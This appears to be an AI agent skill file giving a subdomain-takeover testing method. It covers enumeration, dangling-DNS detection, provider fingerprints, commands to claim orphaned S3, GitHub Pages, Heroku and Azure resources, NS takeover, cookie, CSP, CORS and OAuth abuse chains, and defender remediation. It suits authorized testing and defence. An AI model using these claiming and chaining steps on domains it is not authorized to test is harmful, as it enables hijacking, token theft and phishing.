---
name: offensive-subdomain-takeover
description: "Subdomain takeover testing skill for offensive security assessments and bug bounty hunting. Covers subdomain enumeration (subfinder, amass, assetfinder, crt.sh / certificate transparency, passive DNS sources), detecting dangling DNS records (CNAME/A/NS pointing at deprovisioned cloud resources), fingerprinting vulnerable third-party services (AWS S3/CloudFront, GitHub Pages, Heroku, Azure, Fastly, Shopify, Zendesk, and others per the can-i-take-over-xyz matrix) by their error signatures, claiming orphaned resources to serve attacker content, and NS/DNS-delegation takeover. Includes impact chaining (cookie theft on parent domain, phishing, CSP/CORS/OAuth-redirect bypass, session fixation), tooling (subjack, tko-subs, nuclei takeover templates, dnsReaper), and defender DNS hygiene. Use when hunting for dangling DNS, claimable cloud buckets or app endpoints, orphaned CNAME targets, or wildcard/NS delegation abuse against a target domain."
---

# Subdomain Takeover — Offensive Testing Methodology

Subdomain takeover is the exploitation of a *dangling DNS record* — a DNS entry (usually a `CNAME`, sometimes an `A`/`AAAA` or `NS`) that still points at a third-party resource that has since been deleted, expired, or deprovisioned. Because the resource no longer exists at the provider, an attacker who re-registers the same resource name (an S3 bucket, a GitHub Pages repo, a Heroku app, an Azure endpoint) inherits all traffic sent to the victim's subdomain. The subdomain is trusted — it carries the parent organization's brand, often its cookies, and frequently sits inside its CSP, CORS, and OAuth redirect allowlists — which turns a "forgotten DNS entry" into full content control on a trusted origin. This skill is about finding those dangling records at scale and proving impact safely.

## Quick Workflow

1. Enumerate every subdomain of the target (passive sources, certificate transparency, active brute force, permutations)
2. Resolve each name and extract the full DNS chain (`CNAME` targets, `A`/`NS` records, chained aliases)
3. Flag records pointing at *third-party* infrastructure (not the org's own ASN/IP space)
4. Fetch each dangling candidate over HTTP/HTTPS and match the provider's "unclaimed resource" error signature
5. Confirm the target resource is actually claimable at the provider (bucket name free, app name free, repo deletable)
6. Claim it with a benign proof marker, then assess impact (cookie scope, CSP/CORS/OAuth trust) before reporting

---

## Phase 1 — Subdomain Enumeration

You cannot take over what you cannot see. Breadth matters: takeovers hide on forgotten, non-production hostnames (`staging-cdn`, `old-blog`, `metrics`, `jira-sandbox`) that never appear in navigation. Combine passive, certificate-transparency, and active sources, then de-duplicate.

### Passive Enumeration

```bash
# subfinder — fast passive aggregation across dozens of sources
subfinder -d example.com -all -silent -o subs_subfinder.txt

# amass passive (no active resolution, OSINT only)
amass enum -passive -d example.com -o subs_amass.txt

# assetfinder — quick second opinion
assetfinder --subs-only example.com | tee subs_assetfinder.txt

# findomain
findomain -t example.com -u subs_findomain.txt
```

### Certificate Transparency

CT logs record every publicly issued TLS certificate, including for internal or decommissioned hosts. They are the single richest source for stale subdomains that point at providers.

```bash
# crt.sh via its JSON endpoint — pull all names, split SANs, de-dupe
curl -s 'https://crt.sh/?q=%25.example.com&output=json' \
  | jq -r '.[].name_value' \
  | sed 's/\*\.//g' \
  | tr '[:upper:]' '[:lower:]' \
  | sort -u > subs_crtsh.txt

# Same via the CT API pattern many tools use
curl -s 'https://crt.sh/?q=example.com&output=json' | jq -r '.[].common_name' | sort -u
```

```bash
# Real-time CT firehose to catch new hosts as certs are issued
# certstream streams freshly logged certificates
certstream --json | jq -r 'select(.data.leaf_cert.all_domains[]?|endswith("example.com")) | .data.leaf_cert.all_domains[]'
```

### Passive DNS Sources

Historical/passive DNS preserves records that are no longer served authoritatively — ideal for spotting a `CNAME` that was removed from the zone but still referenced elsewhere.

| Source | Use |
|--------|-----|
| [SecurityTrails](https://securitytrails.com/) | Historical DNS, subdomain lists, prior `CNAME` targets |
| [Censys](https://search.censys.io/) | Cert + host pivots, reverse-CNAME discovery |
| [VirusTotal](https://www.virustotal.com/) | Passive DNS relations per domain |
| [DNSDumpster](https://dnsdumpster.com/) | Quick host/record map |
| [Netlas](https://netlas.io/) | Large-scale DNS/cert pivots |

### Active Brute Force & Permutations

```bash
# Massdns / puredns brute with a resolver list
puredns bruteforce best-dns-wordlist.txt example.com -r resolvers.txt -w subs_brute.txt

# shuffledns wrapper around massdns
shuffledns -d example.com -w wordlist.txt -r resolvers.txt -o subs_shuffle.txt

# Permutation generation on known names (old-, dev-, staging-, -cdn, -assets)
cat all_subs.txt | alterx | puredns resolve -r resolvers.txt -w subs_perms.txt
# or: gotator / dnsgen for permutation seeds
```

### Consolidate

```bash
# Merge everything, normalize, resolve to keep live names
cat subs_*.txt | tr '[:upper:]' '[:lower:]' | sort -u > all_subs.txt
puredns resolve all_subs.txt -r resolvers.txt -w resolved.txt
wc -l all_subs.txt resolved.txt
```

---

## Phase 2 — Detecting Dangling Records

A dangling record is one whose *answer* points somewhere that no longer serves the victim. The three canonical shapes:

- **Dangling `CNAME`** — `blog.example.com CNAME old-app.herokudns.com`, but `old-app` was deleted at Heroku. Most common.
- **Dangling `A`/`AAAA`** — points at a cloud IP (e.g., an elastic IP or an Azure public IP) that was released back into the provider pool and can be re-acquired.
- **Dangling `NS`** — delegation to a nameserver / hosted zone (e.g., a deleted Route 53 hosted zone or an expired DNS-provider zone) that the attacker can recreate, taking the *entire* subtree.

### Extract the DNS Chain

```bash
# Per-host CNAME + A chain with dig
for h in $(cat resolved.txt); do
  echo "=== $h ==="
  dig +noall +answer "$h" CNAME
  dig +noall +answer "$h" A
done | tee dns_chain.txt

# dnsx — fast, structured, follows CNAME chains
dnsx -l all_subs.txt -a -aaaa -cname -ns -resp -json -o dnsx.json

# Pull just the CNAME targets for triage
jq -r 'select(.cname!=null) | "\(.host) -> \(.cname[])"' dnsx.json | sort -u > cname_targets.txt
```

### Flag Third-Party Targets

```bash
# Keep only CNAMEs that leave the org's own domains / ASN — these are takeover candidates
grep -Ev 'example\.com|example\.net' cname_targets.txt \
  | grep -Ei 's3|cloudfront|github\.io|herokudns|azure|trafficmanager|fastly|zendesk|myshopify|pantheon|wpengine|ghost\.io|surge\.sh|bitbucket|readme\.io' \
  > thirdparty_cnames.txt
```

### `NXDOMAIN` and `SERVFAIL` — The Loudest Signals

When a `CNAME` resolves to an alias whose own record returns `NXDOMAIN`, the backing resource is gone — a very strong takeover indicator. For dangling `NS`, `SERVFAIL`/`REFUSED` on the delegated zone is the tell.

```bash
# A CNAME that itself NXDOMAINs = provider resource deleted
for t in $(awk '{print $3}' thirdparty_cnames.txt); do
  status=$(dig +noall +comment "$t" | grep -oE 'status: [A-Z]+' | awk '{print $2}')
  echo "$t -> $status"
done | grep -E 'NXDOMAIN|SERVFAIL' | tee dangling_candidates.txt

# Dangling NS delegation check
dig +noall +answer sub.example.com NS
dig @ns-that-was-delegated.example sub.example.com SOA   # SERVFAIL/REFUSED => reclaimable zone
```

> ⚠ `NXDOMAIN` is necessary but not always sufficient — some providers return 200 with a generic page instead. Always combine DNS status with the HTTP fingerprint in Phase 3.

---

## Phase 3 — Fingerprinting Vulnerable Services

Each provider serves a recognizable error page or header when a hostname points at it but no resource is claimed. Matching that fingerprint — and confirming the target is *claimable* — is what separates a real finding from a false positive. The authoritative, continuously updated matrix is [`can-i-take-over-xyz`](https://github.com/EdOverflow/can-i-take-over-xyz); always check it for the current status of a provider before claiming.

### Fetch and Match

```bash
# httpx — grab status, title, CNAME, and body hash in one pass
httpx -l thirdparty_cnames.txt -cname -title -status-code -web-server -follow-redirects -o http_probe.txt

# Pull the error body for manual signature matching
curl -s -H 'Host: blog.example.com' https://<cname-target>/ | head -c 2000
```

### Provider Error Signatures (representative)

| Service | Typical CNAME target | Unclaimed error signature | Claimable? |
|---------|---------------------|---------------------------|-----------|
| AWS S3 (website) | `*.s3-website-*.amazonaws.com`, `*.s3.amazonaws.com` | `NoSuchBucket` / "The specified bucket does not exist" | ✓ (bucket name free) |
| AWS CloudFront | `*.cloudfront.net` | "The request could not be satisfied" / `ERROR: ...Bad request` with no distribution | ⚠ (needs matching alt-domain) |
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here." (404) | ✓ (repo/custom domain) |
| Heroku | `*.herokudns.com`, `*.herokuapp.com` | "No such app" / default Heroku 404 | ✓ (app name free) |
| Azure (multiple) | `*.azurewebsites.net`, `*.cloudapp.net`, `*.trafficmanager.net`, `*.blob.core.windows.net` | "404 Web Site not found" / `NXDOMAIN` on TM | ✓ (resource name free) |
| Fastly | points at Fastly | "Fastly error: unknown domain" | ⚠ (needs account mapping) |
| Shopify | `*.myshopify.com` | "Sorry, this shop is currently unavailable." | ⚠ (disputed/edge-case) |
| Zendesk | `*.zendesk.com` | "Help Center Closed" / host not mapped | ⚠ (plan-dependent) |
| Pantheon | `*.pantheonsite.io` | "The gods are wise, but do not know of the site which you seek." | ✓ |
| Surge.sh | `*.surge.sh` | "project not found" | ✓ |
| Ghost | `*.ghost.io` | "Domain error" | ⚠ |
| WP Engine | points at WP Engine | "The site you were looking for couldn't be found." | ⚠ |
| Readme.io | `*.readme.io` | "Project doesnt exist... yet!" | ✓ |
| Bitbucket | `*.bitbucket.io` | "Repository not found" | ✓ |

> ⚠ The matrix changes constantly as providers add defenses (e.g., domain-verification, ALIAS validation). "Edge-case" means takeover previously worked but now requires extra conditions. Never assume a signature means claimable — verify at the provider.

### Automated Fingerprinting

```bash
# subjack — classic signatures, verify SSL, match against fingerprints.json
subjack -w all_subs.txt -t 50 -timeout 30 -ssl -c fingerprints.json -v -o subjack_out.txt

# tko-subs — checks CNAMEs against a providers CSV, can auto-verify
tko-subs -domains=all_subs.txt -data=providers-data.csv -output=tkosubs.csv

# nuclei — community-maintained takeover templates (broadest signature set)
nuclei -l all_subs.txt -t http/takeovers/ -o nuclei_takeovers.txt

# dnsReaper — 50+ signature "providers", resolves and fingerprints, low false-positive
dnsreaper file --filename all_subs.txt
```

> Prefer nuclei's `http/takeovers/` and dnsReaper for current signatures; subjack's bundled list ages quickly — refresh `fingerprints.json` from upstream before a run.

---

## Phase 4 — Claiming the Resource (Proof of Concept)

Once a candidate is confirmed dangling *and* the provider resource is free, claim it with a **benign proof marker** — never attacker content, never credential capture. The goal is to prove control, not to abuse trust. Use a unique string tied to your engagement so the finding is attributable and you can prove you (not a third party) hold it.

### S3 Bucket Takeover

```bash
# CNAME: assets.example.com -> my-old-bucket.s3-website-us-east-1.amazonaws.com
# 1. Confirm the bucket name is free
aws s3api head-bucket --bucket my-old-bucket 2>&1   # 404 Not Found => claimable

# 2. Create it in the SAME region the website endpoint implies
aws s3api create-bucket --bucket my-old-bucket --region us-east-1
aws s3 website s3://my-old-bucket/ --index-document index.html

# 3. Upload a harmless proof file
echo "subdomain-takeover PoC - <engagement-id> - contact security@yourco" > index.html
aws s3 cp index.html s3://my-old-bucket/index.html --acl public-read

# 4. Verify via the victim subdomain (Host header carries the trust)
curl -s -H 'Host: assets.example.com' http://my-old-bucket.s3-website-us-east-1.amazonaws.com/
```

### GitHub Pages Takeover

```bash
# CNAME: docs.example.com -> old-org.github.io
# 1. Create a repo under an account you control, add a CNAME file
echo "docs.example.com" > CNAME
echo "subdomain-takeover PoC - <engagement-id>" > index.html
git init && git add . && git commit -m "poc"
# 2. Push and enable Pages on the repo; GitHub binds the custom domain
#    (GitHub now requires domain verification for *.github.io org pages — check can-i-take-over-xyz)
```

### Heroku / Azure / Generic App Endpoints

```bash
# Heroku: CNAME points at an app that returns "No such app"
heroku create old-app-name            # claim the app name
heroku domains:add blog.example.com   # attach the victim subdomain
# deploy a static proof page, then: curl -H 'Host: blog.example.com' https://old-app-name.herokuapp.com/

# Azure: recreate the resource with the exact name the CNAME/endpoint expects
# (App Service: *.azurewebsites.net, Storage: *.blob.core.windows.net, TM profile: *.trafficmanager.net)
az webapp create -g rg -p plan -n old-app-name
```

### Benign Proof Marker

```html
<!-- Serve ONLY this; no JS, no forms, no credential prompts -->
<!doctype html>
<html><body>
<h1>Subdomain Takeover — Authorized PoC</h1>
<p>Engagement: &lt;id&gt; · Controlled by: security@yourco · Date: 2026-01-01</p>
<!-- unique canary token so the subdomain's trust context is demonstrable -->
<p id="canary">takeover-canary-9f3a1c-&lt;engagement-id&gt;</p>
</body></html>
```

---

## Phase 5 — NS / DNS-Level Takeover

Dangling `NS` records are higher impact than `CNAME` takeovers: controlling the delegated nameserver lets you forge **every** record under that subdomain (`A`, `MX`, `TXT`, further `CNAME`s), enabling mail interception, ACME/HTTP-01 certificate issuance, and wildcard control.

```bash
# Enumerate NS delegations and test each for orphaned zones
dnsx -l all_subs.txt -ns -resp -json | jq -r 'select(.ns!=null) | "\(.host) NS \(.ns[])"'

# For each delegated NS, query the zone directly; SERVFAIL/REFUSED => zone deletable/reclaimable
for pair in $(...); do
  sub=...; ns=...
  dig @"$ns" "$sub" SOA +noall +comment | grep -E 'SERVFAIL|REFUSED'
done
```

- **Route 53 hosted-zone reclaim** — a deleted hosted zone frees its assigned nameserver set; recreating the zone *may* reassign the same NS set (historically exploitable; AWS has mitigations, re-test per `can-i-take-over-xyz`).
- **Registrar/DNS-provider expiry** — if the delegated DNS provider account lapses, re-registering the zone there under your account captures the delegation.
- **Lame delegation** — NS points at a provider that will host the zone for anyone who adds it; add the zone to your account and serve records.

---

## Impact & Chaining

A takeover's severity is almost never the static page itself — it is what *trust* the subdomain inherits from the parent. Always assess and document these to justify severity.

### Cookie Theft / Scope Abuse

```http
# If the parent sets cookies with Domain=.example.com, they are sent to ALL subdomains.
# Content you control on sub.example.com can read them (same registrable domain).
GET / HTTP/1.1
Host: takenover.example.com
Cookie: session=<parent-domain-scoped-cookie>   # leaked to attacker-controlled origin
```

- **Session fixation** — set a known session cookie at `Domain=.example.com` from the taken-over subdomain; victim authenticates on the main app using your fixed session.
- **CSRF token / auth bypass** — same-site cookies scoped to the registrable domain reach your origin.

### CSP / CORS / OAuth Trust Bypass

```http
# CSP that allowlists the subdomain now trusts attacker JS:
Content-Security-Policy: script-src 'self' *.example.com
# Host attacker JS at takenover.example.com -> executes in the main app's CSP context.
```

```http
# CORS reflecting/allowing the subdomain leaks authenticated API responses:
Access-Control-Allow-Origin: https://takenover.example.com
Access-Control-Allow-Credentials: true
```

```http
# OAuth redirect_uri allowlist includes the subdomain -> steal auth codes/tokens:
GET /authorize?client_id=app&redirect_uri=https://takenover.example.com/cb&response_type=code HTTP/1.1
Host: idp.example.com
```

### Phishing & Malware Distribution

Attacker content served from a legitimate, brand-owned, valid-TLS subdomain defeats user URL inspection and email/link filters that allowlist the parent domain — ideal for credential harvesting, fake login portals, and watering-hole delivery.

---

## Detection / Defender View

### What Defenders See

- A previously-`NXDOMAIN` or error-ing subdomain suddenly returns `200 OK` with unexpected content.
- New TLS certificate issued for a subdomain the org did not provision (visible in CT logs).
- CloudFront/S3/Heroku access logs for a bucket/app the org believes it deleted.
- Spikes of traffic to a long-dormant hostname.

### Continuous Monitoring Queries

```bash
# Nightly: resolve the full zone, alert on CNAMEs that NXDOMAIN or match provider error signatures
dnsreaper file --filename corporate_subdomains.txt --out-format json | jq '.[] | select(.takeover_detected==true)'

# CT-log watch for unexpected issuance (certstream filtered to your domain)
certstream --json | jq -r 'select(.data.leaf_cert.all_domains[]?|endswith("example.com"))'
```

```spl
# Splunk — a dormant host returns 200 after prolonged non-200/NXDOMAIN history
index=dns OR index=web host="*.example.com"
| stats earliest(_time) as first latest(_time) as last values(status) as statuses by host
| where mvcount(statuses)>1 AND match(statuses,"200")
```

### Defensive Remediation (decommissioning order matters)

1. **Remove the DNS record FIRST**, before deleting the cloud resource. Deleting the resource while the `CNAME` still points at it is what creates the dangling window.
2. **Correct order:** delete `CNAME`/`A`/`NS` in the zone → wait for TTL expiry → then deprovision the S3 bucket / app / hosted zone.
3. **Inventory & ownership** — maintain an authoritative DNS asset inventory mapping each external `CNAME` to an owning team and the live resource it must track.
4. **Continuous scanning** — run dnsReaper/nuclei takeover templates against your own zones on a schedule; alert on any match.
5. **Provider hardening** — enable domain verification (GitHub Pages, Azure custom domains), use S3 bucket ownership controls, avoid wildcard `CNAME`s to shared providers.
6. **CT monitoring** — subscribe to CT alerts (Cert Spotter, certstream) for unexpected certificate issuance.

---

## Engagement Cheatsheet

```bash
# 1. Enumerate (passive + CT + brute), consolidate
subfinder -d example.com -all -silent -o s1.txt
amass enum -passive -d example.com -o s2.txt
assetfinder --subs-only example.com > s3.txt
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sed 's/\*\.//g' > s4.txt
cat s*.txt | tr '[:upper:]' '[:lower:]' | sort -u > all_subs.txt

# 2. Resolve + extract CNAME/NS chains
dnsx -l all_subs.txt -a -cname -ns -resp -json -o dnsx.json
jq -r 'select(.cname!=null) | "\(.host) -> \(.cname[])"' dnsx.json | sort -u > cnames.txt

# 3. Flag dangling (NXDOMAIN on CNAME target) + third-party providers
#    (see Phase 2 loop) -> dangling_candidates.txt

# 4. Fingerprint
nuclei -l all_subs.txt -t http/takeovers/ -o nuclei.txt
dnsreaper file --filename all_subs.txt
subjack -w all_subs.txt -ssl -c fingerprints.json -o subjack.txt

# 5. Verify claimable at provider, claim with benign PoC marker, assess trust impact
# 6. Report: dangling record, provider, PoC URL, cookie/CSP/CORS/OAuth trust, remediation order
```

**Severity drivers:** parent-domain-scoped cookies · subdomain in CSP/CORS/OAuth allowlists · NS-level (full subtree) > CNAME (single host) · mail (MX forgeable via NS takeover).

**Safety rules:** benign proof page only · unique engagement canary · no credential capture · release the claimed resource after verification/reporting · never serve malware or phishing even as "proof".

---

## Key References

- [`can-i-take-over-xyz`](https://github.com/EdOverflow/can-i-take-over-xyz) (EdOverflow) — the canonical, continuously-updated provider takeover matrix with error signatures and current status
- Frans Rosén — ["A deep dive into AWS S3 access controls – taking full control over your assets"](https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/) (Detectify Labs)
- Frans Rosén / Detectify — ["Hostile subdomain takeover using Heroku/GitHub/Desk + more"](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/)
- Patrik Hudak — ["Subdomain takeover: basics"](https://0xpatrik.com/subdomain-takeover-basics/) and ["Subdomain takeover: going after NS records"](https://0xpatrik.com/subdomain-takeover-ns/)
- OWASP Web Security Testing Guide — [Test for Subdomain Takeover (WSTG-CONF-10)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover)
- CWE-350 — Reliance on Reverse DNS Resolution for a Security-Critical Action (DNS-trust class); related: CWE-284 (Improper Access Control), CWE-669 (Incorrect Resource Transfer Between Spheres)
- MITRE ATT&CK — T1584.001 (Compromise Infrastructure: Domains), T1583.001 (Acquire Infrastructure: Domains)
- Tooling: [subjack](https://github.com/haccer/subjack), [tko-subs](https://github.com/anshumanbh/tko-subs), [dnsReaper](https://github.com/punk-security/dnsReaper), [nuclei takeover templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers), [subfinder](https://github.com/projectdiscovery/subfinder), [amass](https://github.com/owasp-amass/amass), [dnsx](https://github.com/projectdiscovery/dnsx), [httpx](https://github.com/projectdiscovery/httpx)
- Representative disclosures: HackerOne Hacktivity "subdomain takeover" reports (e.g., Starbucks, Uber, Shopify programs) — search https://hackerone.com/hacktivity?querystring=subdomain%20takeover for public, resolved examples
